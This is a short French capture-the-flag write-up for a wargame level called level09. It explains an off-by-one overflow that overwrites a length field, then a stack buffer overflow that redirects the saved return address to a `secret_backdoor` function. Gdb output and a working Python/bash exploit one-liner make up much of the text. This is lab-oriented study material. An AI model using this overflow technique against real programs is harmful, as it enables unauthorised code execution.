# Level 09

Le programme lit de 128 charactère et boucle de 0 jusqu'à 40 **compris** (<=) en copiant chaque charactère du buffer dans la structure de taille 40, mais comme il copie 40 compris il dépasse le buffer dans la structure et écrit dans la prochaine variable nommée `message_size` si notre username fait plus de 40.

Ensuite il lit de 1024 et assigne d'une taille donné dans `message_size` dans la variable `message` de la structure, sauf comme on l'a réecrit précédemment il va dépasser la taille de `message` de 140 et possiblement écrire dans la save rip.

En première lieu on donne un username contenant 255 d'une taille de 41 pour écrire 255 dans `message_size`.
Puis écrire l'addresse de la fonction `secret_backdoor` (0x000055555555488c).

Pour trouver l'offset d'rip on va lancer gdb et remplire notre message de 42, après l'appel de strncpy on peut afficher l'addresse du `message` (0x7fffffffe440) et regarde où est stoqué rip (rip at 0x7fffffffe508). DOnt on peut soustraire les deux addresse pour voir combien on doit écrire.
```
(gdb) x/32xg $rbp-192
0x7fffffffe440: 0x4242424242424242      0x4242424242424242
...
0x7fffffffe4f0: 0x4242424242424242      0x0042424242424242
0x7fffffffe500: 0x00007fffffffe5d0      0x0000555555554924
0x7fffffffe510: 0x000000000000000a      0x0000555555554c69
0x7fffffffe520: 0x00007ffff7ff7000      0x00007ffff7a94713
0x7fffffffe530: 0x00007ffff7dd4260      0x00007ffff7dd4260
(gdb) i f
Stack level 0, frame at 0x7fffffffe510:
 rip = 0x5555555549a2 in set_msg; saved rip 0x555555554924
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe500, args:
 Locals at 0x7fffffffe500, Previous frame's sp is 0x7fffffffe510
 Saved registers:
  rbp at 0x7fffffffe500, rip at 0x7fffffffe508
(gdb) p 0x7fffffffe508 - 0x7fffffffe440
$1 = 200
```

 - 0xff comme username
 - L'offset de 200 et l'address `secret_backdoor`
 - Réouvrire la stdin
```bash
( \
	python -c 'print("\xff"*41)'; \
	python -c 'print("B"*200 + "".join([chr((0x000055555555488c >> (i * 8)) & 0xFF) for i in range(64/8)]))'; \
	cat \
) | ./level09
```
